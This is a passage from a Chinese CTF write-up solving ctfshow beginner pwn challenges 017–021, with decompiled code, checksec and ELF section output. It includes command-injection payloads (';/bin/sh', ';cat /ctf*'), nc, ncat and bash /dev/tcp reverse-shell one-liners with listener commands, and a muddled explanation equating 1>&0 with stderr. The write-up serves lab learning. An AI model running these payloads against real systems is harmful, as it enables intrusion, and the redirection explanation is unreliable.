sleep(<span class="number">5u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ctfshow&#123;flag is not here!&#125;&quot;</span>);</span><br><span class="line">        sleep(<span class="number">0x14</span>u);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wtf?You haven&#x27;t left yet?\nOk~ give you flag:\nflag is loading......&quot;</span>);</span><br><span class="line">        sleep(<span class="number">0x1BF52</span>u);</span><br><span class="line">        system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);  </span><br><span class="line">        <span class="comment">/* 假装读取一个隐藏的标志文件，实际上在长时间延迟后才真正尝试读取文件，超过远程环境的时长，本地可以等等看hhhh */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        sleep(<span class="number">2u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;su: Authentication failure&quot;</span>);</span><br><span class="line">        <span class="comment">/* 模拟失败的身份验证尝试 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;See you!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;command not found!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 这个程序存在明显的安全漏洞，比如在案例2中，strcat没有检查buf的长度，可能导致缓冲区溢出。此外，直接使用system函数执行用户提供的输入也存在命令注入的风险 */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.id&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.ls&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.cat /ctfshow_flag&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.su&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;5.exit&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>选项3最后会执行system(“cat /ctfshow_flag”);命令，虽然最终能达到我们想要的效果，但是它sleep了很久很久，本地等的话没什么问题，但是远程环境并没有这么久，因此这条直接pass.</li>
<li>其他1/4/5选项都没有实质性作用，但是2那里会有问题，我们可以进行拼接，限制了10字节，但是我们完全够用，可以构造出<code>;cat /ctf*</code> <code>;/bin/sh</code>等直接拿取一个shell或者直接读出flag</li>
<li>在Linux中，通配符 * 表示匹配任意长度（包括零长度）的任意字符序列。所以<code>cat /ctf*</code>能够读到flag</li>
</ul>
<h3 id="018-看源码喵"><a class="header-anchor" href="#018-看源码喵">¶</a>018  看源码喵</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn018/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位保护全开</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B10);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C20);</span><br><span class="line">  <span class="built_in">puts</span>(asc_CB0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D38);</span><br><span class="line">  <span class="built_in">puts</span>(asc_DD0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Do you know redirect output ?                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which is the real flag?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">9</span> )</span><br><span class="line">    fake();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    real();</span><br><span class="line">  system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fake</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;&gt;/ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">real</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;/ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>读取用户输入，是9执行fake()，不是9执行real()</li>
<li>看源码，两个函数的区别在于中间是<code>&gt;&gt;</code> 还是 <code>&gt;</code></li>
<li><code>system(&quot;echo 'flag is here'&gt;&gt;/ctfshow_flag&quot;);</code></li>
<li>这个命令将字符串 ‘flag is here’ <strong><u><em>追加写入</em></u></strong> /ctfshow_flag 文件中。 &gt;&gt; 符号表示以追加的方式写入文件，如果文件不存在则创建新文件。如果 /ctfshow_flag 文件已经存在，那么该命令会在文件的末尾添加 ‘flag is here’ 。</li>
<li><code>system(&quot;echo 'flag is here'&gt;/ctfshow_flag&quot;);</code></li>
<li>这个命令将字符串 ‘flag is here’ <strong><u><em>覆盖写入</em></u></strong> /ctfshow_flag 文件中。 &gt; 符号表示以覆盖的方式写入文件，如果文件不存在则创建新文件。如果 /ctfshow_flag 文件已经存在，那么该命令会将文件中原有的内容替换为 ‘flag is here’ 。</li>
<li>在远程环境中需要在第一次读到flag，否则后续得到的flag都已经被覆写再追加，真实的flag内容乌拉！</li>
</ul>
<h3 id="019-父子进程（还是有一点点懵"><a class="header-anchor" href="#019-父子进程（还是有一点点懵">¶</a>019  父子进程（还是有一点点懵</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn019/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">64位保护全开</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(asc_BF0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_C70);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D00);</span><br><span class="line">  <span class="built_in">puts</span>(asc_D90);</span><br><span class="line">  <span class="built_in">puts</span>(asc_E18);</span><br><span class="line">  <span class="built_in">puts</span>(asc_EB0);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Turn off output, how to get flag? &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ( fork() )  <span class="comment">// 父进程</span></span><br><span class="line">  <span class="comment">/* fork系统调用创建了一个子进程，使得当前进程的副本运行。父进程和子进程共享相同的代码，但有独立的进程上下文。如果fork成功，它返回子进程的PID给父进程，而在子进程中返回0 */</span></span><br><span class="line">  &#123;</span><br><span class="line">    wait(<span class="number">0LL</span>);  <span class="comment">/* 父进程在这里等待任何子进程的终止。wait系统调用会阻塞直到一个子进程结束 */</span></span><br><span class="line">    sleep(<span class="number">3u</span>);  <span class="comment">/* 让父进程休眠三秒，给子进程足够的时间执行 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag is not here!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>  <span class="comment">// 子进程</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;give you a shell! now you need to get flag!&quot;</span>);</span><br><span class="line">    fclose(_bss_start);  <span class="comment">// 关闭文件输出流</span></span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);  <span class="comment">// 从标准输入中读取用户输入的命令，并存储在 buf 中</span></span><br><span class="line">    system(buf);  <span class="comment">// 执行用户输入的命令</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 程序设计了一个简单的父子进程交互，其中子进程提供了用户一个shell，让用户尝试找到旗帜 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>if (fork()) : 这里使用 fork() 函数创建一个子进程。父进程中， fork() 返回子进程的进程ID，所以进入 if 语句块；子进程中， fork() 返回0，所以进入 else 语句块。</p>
</li>
<li>
<p>在父进程中：<code>wait(0LL)</code> : 父进程通过 wait() 函数等待子进程的结束，以确保子进程执行完毕。</p>
</li>
<li>
<p><code>sleep(3u)</code>    父进程睡眠3秒钟。</p>
</li>
<li>
<p><code>printf(&quot;flag is not here!&quot;)</code>   输出提示信息，表明flag不在此处</p>
</li>
<li>
<p>在子进程中：puts(“give you a shell! now you need to get flag!”) : 输出提示信息，表示给予用户一个shell，让其获取flag。</p>
<ul>
<li><code>fclose()</code>    关闭文件输出流。</li>
<li><code>read(0, &amp;buf, 0x20uLL)</code>    从标准输入中读取用户输入的命令，并存储在 buf 中</li>
<li><code>system(&amp;buf)</code>     执行用户输入的命令。</li>
</ul>
</li>
<li>
<p>我们可以使用了 <code>exec 函数来执行sh命令</code>，并使用 <code>1&gt;&amp;0 来进行输出重定向</code>。这个命令将标准输出重定向到标准输入，实际上就是将命令的输出发送到后续命令的输入。</p>
</li>
<li>
<p>具体来说， 1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入。通过将标准输出重定向到标准输入，可以实现将命令的输出作为后续命令的输入。这样可以在执行 sh 命令后，进入一个交互式的Shell环境，可以在该环境中执行命令并与用户进行交互。</p>
</li>
<li>
<p>也可以直接<code>exec cat /ctf* 1&gt;&amp;0</code> 将 <code>cat /ctf*</code>命令的输出发送到标准输入，实际上就是将命令的输出再次输出到屏幕上。</p>
<ol>
<li><strong>执行<code>cat</code>命令</strong>：<code>exec</code>系统调用用于替换当前进程的映像，即它将当前正在运行的程序替换成由其参数指定的新程序。在这个例子中，新程序是<code>cat</code>命令</li>
<li><strong>查找并显示旗帜文件</strong>：<code>cat /ctf*</code>这一部分意味着<code>cat</code>命令将尝试显示所有以<code>ctf</code>开头的文件的内容。假设存在一个名为<code>ctfshow_flag</code>的文件，那么<code>cat</code>命令将会显示它的内容。这是许多CTF竞赛中常见的做法，旗帜文件通常包含解题的关键</li>
<li><strong>重定向标准输出到标准错误</strong>：<code>1&gt;&amp;0</code>是输出重定向语法的一部分，这里的<code>1</code>指的是标准输出（stdout），<code>0</code>指的是标准输入（stdin）。<code>&amp;</code>符号表示“复制描述符”。因此，<code>1&gt;&amp;0</code>意味着<u>将标准输出重定向到标准错误输出（stderr）的位置</u>，即原本标准输入被读取的地方。在大多数情况下，<code>stderr</code>和<code>stdout</code>都默认连接到终端，但它们可以被分别重定向到不同的地方</li>
<li><strong>规避父进程的输出捕获</strong>：在程序中，父进程在等待子进程结束后，会打印一条消息说“flag is not here!”。通过将<code>cat</code>命令的标准输出重定向到标准错误，我们可以利用子进程执行<code>cat</code>命令时的输出，而不是等待父进程的输出。由于父进程在<code>wait</code>之后立即调用了<code>printf</code>，它实际上是在读取标准输出，但我们的<code>cat</code>命令输出被<u>重定向到了标准错误</u>，因此<u>不会被父进程捕获</u></li>
<li><strong>利用子进程的shell</strong>：当用户在子进程中输入<code>exec cat /ctf* 1&gt;&amp;0</code>并执行时，子进程会被替换为<code>cat</code>命令，显示旗帜文件的内容，而这些内容不会被父进程看到，因为输出重定向到了标准错误，而不是标准输出</li>
</ol>
</li>
<li>
<p>这里限制了20个字节，**<u><em>反弹shell</em></u>**的话理论上也可行，感兴趣的可以自行去尝试</p>
</li>
</ul>
<h4 id="反弹shell（当然现在还不知道咋搞"><a class="header-anchor" href="#反弹shell（当然现在还不知道咋搞">¶</a>反弹shell（当然现在还不知道咋搞</h4>
<ul>
<li>以下来自通义灵码回答，苯人还在探索怎么做</li>
</ul>
<h5 id="1-选择反弹shell的命令"><a class="header-anchor" href="#1-选择反弹shell的命令">¶</a>1. 选择反弹shell的命令</h5>
<p>你需要一个简短的命令来建立一个从目标机器到你的机器的反向连接。对于基于bash的shell，你可以使用以下命令之一：</p>
<ul>
<li><strong>ncat</strong>: <code>ncat -e /bin/bash &lt;your IP&gt; &lt;your listening port&gt;</code></li>
<li><strong>netcat</strong>: <code>nc &lt;your IP&gt; &lt;your listening port&gt; -e /bin/bash</code></li>
<li><strong>bash</strong>: <code>bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;your IP&gt;/&lt;your listening port&gt; 0&gt;&amp;1'</code></li>
</ul>
<p>其中 <code>&lt;your IP&gt;</code> 是你控制的机器的IP地址，<code>&lt;your listening port&gt;</code> 是你将在上面监听的端口。</p>
<h5 id="2-在你的机器上监听端口"><a class="header-anchor" href="#2-在你的机器上监听端口">¶</a>2. 在你的机器上监听端口</h5>
<p>在你的机器上，使用<code>ncat</code>或<code>netcat</code>来监听指定的端口。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ncat -lvnp &lt;your listening port&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1nc -lvp &lt;your listening port&gt;</span><br></pre></td></tr></table></figure>
<p>这将打开一个监听连接，等待目标机器的反向连接</p>
<h5 id="3-在目标机器上执行反弹shell命令"><a class="header-anchor" href="#3-在目标机器上执行反弹shell命令">¶</a>3. 在目标机器上执行反弹shell命令</h5>
<p>在目标机器上，你只有20个字节的输入空间。你需要确保你的反弹shell命令足够短小，同时包含必要的信息。例如，对于<code>ncat</code>命令，你可以这样输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ncat -e /bin/bash IP PORT</span><br></pre></td></tr></table></figure>
<p>但因为IP地址和端口号占用了不少字符，你需要精简这个命令。一种方法是使用<code>bash</code>命令，它通常更紧凑：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
<p>但是由于字符限制，你可能需要进一步缩短IP地址，使用数字形式而不是域名，或者使用特殊的字符编码技术来减少字符数</p>
<h5 id="4-输入反弹shell命令"><a class="header-anchor" href="#4-输入反弹shell命令">¶</a>4. 输入反弹shell命令</h5>
<p>在目标机器的输入限制内，尽可能准确地输入反弹shell命令。例如，如果你的IP地址是<code>192.168.1.1</code>，并且你监听的端口是<code>1234</code>，你的命令可能是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.1/1234 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
<p>但是由于字符限制，你可能需要进一步优化这个命令</p>
<h5 id="示例"><a class="header-anchor" href="#示例">¶</a>示例</h5>
<p>一个极端的压缩版本，假设你的IP地址是<code>127.0.0.1</code>和端口是<code>4444</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1bash -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
<p>但是，请注意，<code>127.0.0.1</code>通常表示本地主机，所以在这个上下文中，你应当使用实际的IP地址</p>
<h3 id="020-got和-got-plt表"><a class="header-anchor" href="#020-got和-got-plt表">¶</a>020  .got和.got.plt表</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn020/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">64位  仅开启NX保护，RELRO保护完全关闭</span><br></pre></td></tr></table></figure>
<h4 id="RELRO保护"><a class="header-anchor" href="#RELRO保护">¶</a>RELRO保护</h4>
<ul>
<li>RELRO（RELocation Read-Only）是一种可选的二进制保护机制，用于增加程序的安全性。</li>
<li>它主要通过限制和保护全局偏移表（Global Offset Table，简称 GOT）和过程链接表（Procedure LinkageTable，简称 PLT）的可写性来防止针对这些结构的攻击</li>
</ul>
<h5 id="三种状态"><a class="header-anchor" href="#三种状态">¶</a>三种状态</h5>
<ol>
<li>
<p><strong>No RELRO</strong>：在这种状态下，GOT和PLT都是可写的，意味着攻击者可以修改这些表中的指针，从而进行攻击。这是最弱的保护状态。</p>
</li>
<li>
<p><strong>Partial RELRO</strong>：在这种状态下，GOT的开头部分被设置为只读（RO），而剩余部分仍然可写。这样可以防止一些简单的攻击，但仍存在一些漏洞。</p>
</li>
<li>
<p><strong>Full RELRO</strong>：在这种状态下，GOT和PLT都被设置为只读（RO）。这样做可以防止对这些结构的修改，提供更强的保护。任何对这些表的修改都会导致程序异常终止。</p>
</li>
</ol>
<h4 id="开始解题"><a class="header-anchor" href="#开始解题">¶</a>开始解题</h4>
<ul>
<li>
<pre><code>checksec pwn
[*] '/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn020/pwn'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
64位  仅开了NX保护  RELRO完全关闭
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- `objdump -R pwn`   用来显示可执行文件 `pwn` 中的动态重定位条目（dynamic relocation entries）   使用 `-R` 选项时，`objdump` 会输出所有动态重定位条目的列表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
<p>objdump -R pwn</p>
<p>pwn:     file format elf64-x86-64</p>
<p>DYNAMIC RELOCATION RECORDS<br>
OFFSET           TYPE              VALUE<br>
0000000000600f18 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5<br>
0000000000600f20 R_X86_64_GLOB_DAT  <strong>gmon_start</strong><br>
0000000000600f40 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5<br>
0000000000600f48 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5<br>
0000000000600f50 R_X86_64_JUMP_SLOT  strtol@GLIBC_2.2.5</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- `readelf -S pwn`   查看表项地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>readelf -S pwn<br>
There are 29 section headers, starting at offset 0x1878:</p>
<p>Section Headers:<br>
[Nr] Name              Type             Address           Offset<br>
Size              EntSize          Flags  Link  Info  Align<br>
[ 0]                   NULL             0000000000000000  00000000<br>
0000000000000000  0000000000000000           0     0     0<br>
[ 1] .interp           PROGBITS         0000000000400200  00000200<br>
000000000000001c  0000000000000000   A       0     0     1<br>
[ 2] .note.ABI-tag     NOTE             000000000040021c  0000021c<br>
0000000000000020  0000000000000000   A       0     0     4<br>
[ 3] .note.gnu.build-i NOTE             000000000040023c  0000023c<br>
0000000000000024  0000000000000000   A       0     0     4<br>
[ 4] .gnu.hash         GNU_HASH         0000000000400260  00000260<br>
000000000000001c  0000000000000000   A       5     0     8<br>
[ 5] .dynsym           DYNSYM           0000000000400280  00000280<br>
0000000000000090  0000000000000018   A       6     1     8<br>
[ 6] .dynstr           STRTAB           0000000000400310  00000310<br>
000000000000004b  0000000000000000   A       0     0     1<br>
[ 7] .gnu.version      VERSYM           000000000040035c  0000035c<br>
000000000000000c  0000000000000002   A       5     0     2<br>
[ 8] .gnu.version_r    VERNEED          0000000000400368  00000368<br>
0000000000000020  0000000000000000   A       6     1     8<br>
[ 9] .rela.dyn         RELA             0000000000400388  00000388<br>
0000000000000030  0000000000000018   A       5     0     8<br>
[10] .rela.plt         RELA             00000000004003b8  000003b8<br>
0000000000000048  0000000000000018  AI       5    22     8<br>
[11] .init             PROGBITS         0000000000400400  00000400<br>
0000000000000017  0000000000000000  AX       0     0     4<br>
[12] .plt              PROGBITS         0000000000400420  00000420<br>
0000000000000040  0000000000000010  AX       0     0     16<br>
[13] .text             PROGBITS         0000000000400460  00000460<br>
0000000000000252  0000000000000000  AX       0     0     16<br>
[14] .fini             PROGBITS         00000000004006b4  000006b4<br>
0000000000000009  0000000000000000  AX       0     0     4<br>
[15] .rodata           PROGBITS         00000000004006c0  000006c0<br>
000000000000053a  0000000000000000   A       0     0     8<br>
[16] .eh_frame_hdr     PROGBITS         0000000000400bfc  00000bfc<br>
000000000000003c  0000000000000000   A       0     0     4<br>
[17] .eh_frame         PROGBITS         0000000000400c38  00000c38<br>
0000000000000100  0000000000000000   A       0     0     8<br>
[18] .init_array       INIT_ARRAY       0000000000600d38  00000d38<br>
0000000000000008  0000000000000008  WA       0     0     8<br>
[19] .fini_array       FINI_ARRAY       0000000000600d40  00000d40<br>
0000000000000008  0000000000000008  WA       0     0     8<br>
[20] .dynamic          DYNAMIC          0000000000600d48  00000d48<br>
00000000000001d0  0000000000000010  WA       6     0     8<br>
[21] .got              PROGBITS         0000000000600f18  00000f18<br>
0000000000000010  0000000000000008  WA       0     0     8<br>
[22] .got.plt          PROGBITS         0000000000600f28  00000f28<br>
0000000000000030  0000000000000008  WA       0     0     8<br>
[23] .data             PROGBITS         0000000000600f58  00000f58<br>
0000000000000010  0000000000000000  WA       0     0     8<br>
[24] .bss              NOBITS           0000000000600f68  00000f68<br>
0000000000000008  0000000000000000  WA       0     0     1<br>
[25] .comment          PROGBITS         0000000000000000  00000f68<br>
0000000000000029  0000000000000001  MS       0     0     1<br>
[26] .symtab           SYMTAB           0000000000000000  00000f98<br>
00000000000005e8  0000000000000018          27    43     8<br>
[27] .strtab           STRTAB           0000000000000000  00001580<br>
00000000000001f1  0000000000000000           0     0     1<br>
[28] .shstrtab         STRTAB           0000000000000000  00001771<br>
0000000000000103  0000000000000000           0     0     1<br>
Key to Flags:<br>
W (write), A (alloc), X (execute), M (merge), S (strings), I (info),<br>
L (link order), O (extra OS processing required), G (group), T (TLS),<br>
C (compressed), x (unknown), o (OS specific), E (exclude),<br>
l (large), p (processor specific)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 提取关键部分：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>[21] .got        PROGBITS         0000000000600f18  00000f18<br>
0000000000000010  0000000000000008  WA     0    0     8<br>
[22] .got.plt    PROGBITS       0000000000600f28  00000f28<br>
0000000000000030  0000000000000008  WA     0     0     8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- `.got`  `600f18`</span><br><span class="line">- `.got.plt`  `600f28`</span><br><span class="line">- 测试一下：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>./pwn 600f18<br>
RELRO: 52454c52</p>
<p>ctfshow@ubuntu:~/Desktop/ctfshow-pwn-primary/pwn020$ ./pwn 600f28<br>
RELRO: 52454c52</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 发现程序正常执行，.got表和.got.plt表都可写</span><br><span class="line">- ctfshow&#123;1_1_0x600f18_0x600f28&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 021  .got和.got.plt表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>checksec pwn<br>
[*] ‘/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn021/pwn’<br>
Arch:     amd64-64-little<br>
RELRO:    Partial RELRO<br>
Stack:    No canary found<br>
NX:       NX enabled<br>
PIE:      No PIE (0x400000)<br>
64位   NX关闭   RELRO保护部分开启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>objdump -R pwn</p>
<p>pwn:     file format elf64-x86-64</p>
<p>DYNAMIC RELOCATION RECORDS<br>
OFFSET           TYPE              VALUE<br>
0000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5<br>
0000000000600ff8 R_X86_64_GLOB_DAT  <strong>gmon_start</strong><br>
0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5<br>
0000000000601020 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5<br>
0000000000601028 R_X86_64_JUMP_SLOT  strtol@GLIBC_2.2.5</p>
<p>readelf -S pwn<br>
There are 29 section headers, starting at offset 0x1950:</p>
<p>Section Headers:<br>
[Nr] Name              Type             Address           Offset<br>
Size              EntSize          Flags  Link  Info  Align<br>
[ 0]                   NULL             0000000000000000  00000000<br>
0000000000000000  0000000000000000           0     0     0<br>
[ 1] .interp           PROGBITS         0000000000400238  00000238<br>
000000000000001c  0000000000000000   A       0     0     1<br>
[ 2] .note.ABI-tag     NOTE             0000000000400254  00000254<br>
0000000000000020  0000000000000000   A       0     0     4<br>
[ 3] .note.gnu.build-i NOTE             0000000000400274  00000274<br>
0000000000000024  0000000000000000   A       0     0     4<br>
[ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298<br>
000000000000001c  0000000000000000   A       5     0     8<br>
[ 5] .dynsym           DYNSYM           00000000004002b8  000002b8<br>
0000000000000090  0000000000000018   A       6     1     8<br>
[ 6] .dynstr           STRTAB           0000000000400348  00000348<br>
000000000000004b  0000000000000000   A       0     0     1<br>
[ 7] .gnu.version      VERSYM           0000000000400394  00000394<br>
000000000000000c  0000000000000002   A       5     0     2<br>
[ 8] .gnu.version_r    VERNEED          00000000004003a0  000003a0<br>
0000000000000020  0000000000000000   A       6     1     8<br>
[ 9] .rela.dyn         RELA             00000000004003c0  000003c0<br>
0000000000000030  0000000000000018   A       5     0     8<br>
[10] .rela.plt         RELA             00000000004003f0  000003f0<br>
0000000000000048  0000000000000018  AI       5    22     8<br>
[11] .init             PROGBITS         0000000000400438  00000438<br>
0000000000000017  0000000000000000  AX       0     0     4<br>
[12] .plt              PROGBITS         0000000000400450  00000450<br>
0000000000000040  0000000000000010  AX       0     0     16<br>
